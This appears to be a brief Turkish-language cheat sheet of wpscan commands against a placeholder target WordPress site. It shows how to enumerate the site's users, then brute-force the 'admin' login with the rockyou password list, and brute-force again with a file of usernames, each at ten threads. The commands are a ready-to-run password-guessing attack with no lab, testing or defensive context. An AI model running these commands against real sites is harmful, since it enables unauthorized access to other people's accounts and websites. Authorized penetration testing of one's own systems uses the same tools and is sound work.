hedef site üzerinde kullanıcı bulma
```bash
wpscan --url http://hedefsite.com -e u
```

Brute Force Şifre Denemesi
```bash
wpscan --url http://hedefsite.com \
--passwords /usr/share/wordlists/rockyou.txt \
--usernames admin \
--max-threads 10

```
 Ekstra: Kullanıcı Listesi ile Brute Force

```bash
wpscan --url http://hedefsite.com \
--passwords /usr/share/wordlists/rockyou.txt \
--usernames users.txt \
--max-threads 10

```

